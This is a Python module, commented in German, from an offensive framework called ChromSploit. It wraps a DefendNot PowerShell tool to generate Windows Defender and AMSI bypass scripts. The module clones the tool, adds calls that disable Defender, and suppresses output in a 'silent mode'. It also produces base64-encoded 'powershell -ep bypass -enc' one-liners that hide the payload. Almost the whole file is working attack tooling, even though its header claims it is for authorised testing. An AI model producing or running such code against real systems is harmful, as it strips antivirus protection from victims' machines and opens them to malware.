#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChromSploit Framework v2.0
DefendNot Integration für Windows Defender Bypass
Für Bildungs- und autorisierte Penetrationstests
"""

import os
import sys
import time
import json
import base64
import random
import string
import subprocess
from typing import Dict, List, Any, Optional, Tuple, Union

from core.colors import Colors
from core.logger import Logger
from core.utils import Utils
from core.path_utils import PathUtils

class DefendNotIntegration:
    """
    Integration von DefendNot für Windows Defender Bypass in ChromSploit
    """
    
    def __init__(self, logger: Optional[Logger] = None):
        """
        Initialisiert die DefendNot-Integration
        
        Args:
            logger (Logger, optional): Logger-Instanz
        """
        self.logger = logger
        self.defendnot_dir = os.path.join(PathUtils.get_data_dir(), "defendnot")
        self.defendnot_repo = "https://github.com/APTortellini/DefendNot"
        self.defendnot_script_path = os.path.join(self.defendnot_dir, "DefendNot.ps1")
        
        # Sicherstellen, dass das Verzeichnis existiert
        PathUtils.ensure_dir_exists(self.defendnot_dir)
    
    def log(self, level: str, message: str) -> None:
        """
        Loggt eine Nachricht
        
        Args:
            level (str): Log-Level
            message (str): Nachricht
        """
        if self.logger:
            if level == "info":
                self.logger.info(message)
            elif level == "warning":
                self.logger.warning(message)
            elif level == "error":
                self.logger.error(message)
            elif level == "debug":
                self.logger.debug(message)
        else:
            print(f"{Colors.BLUE}[*] {message}{Colors.RESET}" if level == "info" else
                  f"{Colors.YELLOW}[!] {message}{Colors.RESET}" if level == "warning" else
                  f"{Colors.RED}[-] {message}{Colors.RESET}" if level == "error" else
                  f"{Colors.MAGENTA}[D] {message}{Colors.RESET}")
    
    def is_available(self) -> bool:
        """
        Überprüft, ob DefendNot verfügbar ist
        
        Returns:
            bool: True, wenn DefendNot verfügbar ist, sonst False
        """
        return os.path.exists(self.defendnot_script_path)
    
    def download_defendnot(self, force: bool = False) -> bool:
        """
        Lädt DefendNot herunter
        
        Args:
            force (bool, optional): Ob bestehende Dateien überschrieben werden sollen
            
        Returns:
            bool: True bei erfolgreicher Installation, sonst False
        """
        if self.is_available() and not force:
            self.log("info", "DefendNot ist bereits verfügbar")
            return True
        
        self.log("info", "Lade DefendNot herunter...")
        
        try:
            # Temporäres Verzeichnis für das Klonen
            temp_dir = os.path.join(self.defendnot_dir, "temp")
            PathUtils.ensure_dir_exists(temp_dir)
            
            # DefendNot-Repository klonen
            self.log("info", "Klone DefendNot-Repository...")
            clone_cmd = f"git clone {self.defendnot_repo} {temp_dir}"
            subprocess.run(clone_cmd, shell=True, check=True)
            
            # DefendNot.ps1 in das Hauptverzeichnis kopieren
            self.log("info", "Kopiere DefendNot.ps1...")
            source_path = os.path.join(temp_dir, "DefendNot.ps1")
            
            if os.path.exists(source_path):
                import shutil
                shutil.copy2(source_path, self.defendnot_script_path)
                self.log("info", f"DefendNot.ps1 erfolgreich kopiert: {self.defendnot_script_path}")
            else:
                self.log("error", f"DefendNot.ps1 nicht gefunden in: {source_path}")
                return False
            
            # Temporäres Verzeichnis löschen
            self.log("info", "Räume auf...")
            cleanup_cmd = f"rm -rf {temp_dir}"
            subprocess.run(cleanup_cmd, shell=True, check=True)
            
            return self.is_available()
        except Exception as e:
            self.log("error", f"Fehler beim Herunterladen von DefendNot: {str(e)}")
            return False
    
    def generate_bypass_script(self, 
                             bypass_method: str = "wsc", 
                             silent_mode: bool = True,
                             output_file: Optional[str] = None) -> Optional[str]:
        """
        Generiert ein PowerShell-Script zum Umgehen von Windows Defender
        
        Args:
            bypass_method (str, optional): Bypass-Methode (wsc, amsi, all)
            silent_mode (bool, optional): Ob der stille Modus aktiviert werden soll
            output_file (str, optional): Pfad zur Ausgabedatei
            
        Returns:
            str: Pfad zum generierten Script oder None bei Fehler
        """
        if not self.is_available():
            self.log("warning", "DefendNot ist nicht verfügbar")
            self.log("info", "Versuche, DefendNot herunterzuladen...")
            
            if not self.download_defendnot():
                self.log("error", "Fehler beim Herunterladen von DefendNot")
                return None
        
        # Ausgabedatei festlegen
        if not output_file:
            output_dir = os.path.join(PathUtils.get_output_dir(), "defendnot")
            PathUtils.ensure_dir_exists(output_dir)
            
            # Zufälligen Dateinamen generieren
            random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            output_file = os.path.join(output_dir, f"defender_bypass_{random_suffix}.ps1")
        
        self.log("info", f"Generiere Windows Defender Bypass-Script mit Methode: {bypass_method}...")
        
        try:
            # DefendNot.ps1 lesen
            with open(self.defendnot_script_path, "r") as f:
                script_content = f.read()
            
            # Angepasstes Script erstellen
            bypass_script = f"""
# ChromSploit Framework - Windows Defender Bypass
# Generiert mit DefendNot (https://github.com/APTortellini/DefendNot)

{script_content}

# Bypass-Konfiguration
"""
            
            # Bypass-Methode hinzufügen
            if bypass_method == "wsc":
                bypass_script += """
# WSC API Bypass
Write-Host "[*] Aktiviere WSC API Bypass..."
Invoke-WSCBypass
"""
            elif bypass_method == "amsi":
                bypass_script += """
# AMSI Bypass
Write-Host "[*] Aktiviere AMSI Bypass..."
Invoke-AMSIBypass
"""
            elif bypass_method == "all":
                bypass_script += """
# Vollständiger Bypass (WSC + AMSI)
Write-Host "[*] Aktiviere vollständigen Defender Bypass..."
Invoke-DefenderKill
"""
            
            # Stiller Modus
            if silent_mode:
                bypass_script = bypass_script.replace('Write-Host', '# Write-Host')
                bypass_script += """
# Stiller Modus aktiviert
$ErrorActionPreference = 'SilentlyContinue'
"""
            
            # Script in Datei schreiben
            with open(output_file, "w") as f:
                f.write(bypass_script)
            
            self.log("info", f"Windows Defender Bypass-Script erfolgreich generiert: {output_file}")
            return output_file
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Bypass-Scripts: {str(e)}")
            return None
    
    def generate_oneliner(self, bypass_method: str = "wsc", silent_mode: bool = True) -> str:
        """
        Generiert einen PowerShell-Oneliner zum Umgehen von Windows Defender
        
        Args:
            bypass_method (str, optional): Bypass-Methode (wsc, amsi, all)
            silent_mode (bool, optional): Ob der stille Modus aktiviert werden soll
            
        Returns:
            str: PowerShell-Oneliner
        """
        if not self.is_available():
            self.log("warning", "DefendNot ist nicht verfügbar")
            self.log("info", "Versuche, DefendNot herunterzuladen...")
            
            if not self.download_defendnot():
                self.log("error", "Fehler beim Herunterladen von DefendNot")
                return ""
        
        try:
            # DefendNot.ps1 lesen
            with open(self.defendnot_script_path, "r") as f:
                script_content = f.read()
            
            # Angepasstes Script erstellen
            bypass_script = script_content
            
            # Bypass-Methode hinzufügen
            if bypass_method == "wsc":
                bypass_script += "\nInvoke-WSCBypass"
            elif bypass_method == "amsi":
                bypass_script += "\nInvoke-AMSIBypass"
            elif bypass_method == "all":
                bypass_script += "\nInvoke-DefenderKill"
            
            # Stiller Modus
            if silent_mode:
                bypass_script = bypass_script.replace('Write-Host', '# Write-Host')
                bypass_script += "\n$ErrorActionPreference = 'SilentlyContinue'"
            
            # Script Base64-kodieren
            encoded_script = base64.b64encode(bypass_script.encode("utf-16-le")).decode("utf-8")
            
            # PowerShell-Oneliner erstellen
            oneliner = f'powershell -ep bypass -enc {encoded_script}'
            
            return oneliner
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Oneliners: {str(e)}")
            return ""
    
    def generate_base64_payload(self, bypass_method: str = "wsc", silent_mode: bool = True) -> str:
        """
        Generiert einen Base64-kodierten Payload zum Umgehen von Windows Defender
        
        Args:
            bypass_method (str, optional): Bypass-Methode (wsc, amsi, all)
            silent_mode (bool, optional): Ob der stille Modus aktiviert werden soll
            
        Returns:
            str: Base64-kodierter Payload
        """
        if not self.is_available():
            self.log("warning", "DefendNot ist nicht verfügbar")
            self.log("info", "Versuche, DefendNot herunterzuladen...")
            
            if not self.download_defendnot():
                self.log("error", "Fehler beim Herunterladen von DefendNot")
                return ""
        
        try:
            # DefendNot.ps1 lesen
            with open(self.defendnot_script_path, "r") as f:
                script_content = f.read()
            
            # Angepasstes Script erstellen
            bypass_script = script_content
            
            # Bypass-Methode hinzufügen
            if bypass_method == "wsc":
                bypass_script += "\nInvoke-WSCBypass"
            elif bypass_method == "amsi":
                bypass_script += "\nInvoke-AMSIBypass"
            elif bypass_method == "all":
                bypass_script += "\nInvoke-DefenderKill"
            
            # Stiller Modus
            if silent_mode:
                bypass_script = bypass_script.replace('Write-Host', '# Write-Host')
                bypass_script += "\n$ErrorActionPreference = 'SilentlyContinue'"
            
            # Script Base64-kodieren
            encoded_script = base64.b64encode(bypass_script.encode("utf-16-le")).decode("utf-8")
            
            return encoded_script
        except Exception as e:
            self.log("error", f"Fehler beim Generieren des Base64-Payloads: {str(e)}")
            return ""
    
    def get_available_methods(self) -> Dict[str, str]:
        """
        Gibt alle verfügbaren Bypass-Methoden zurück
        
        Returns:
            dict: Dictionary mit allen Methoden
        """
        methods = {
            "wsc": "Windows Security Center API Bypass",
            "amsi": "Anti-Malware Scan Interface Bypass",
            "all": "Vollständiger Defender Bypass (WSC + AMSI)"
        }
        
        return methods
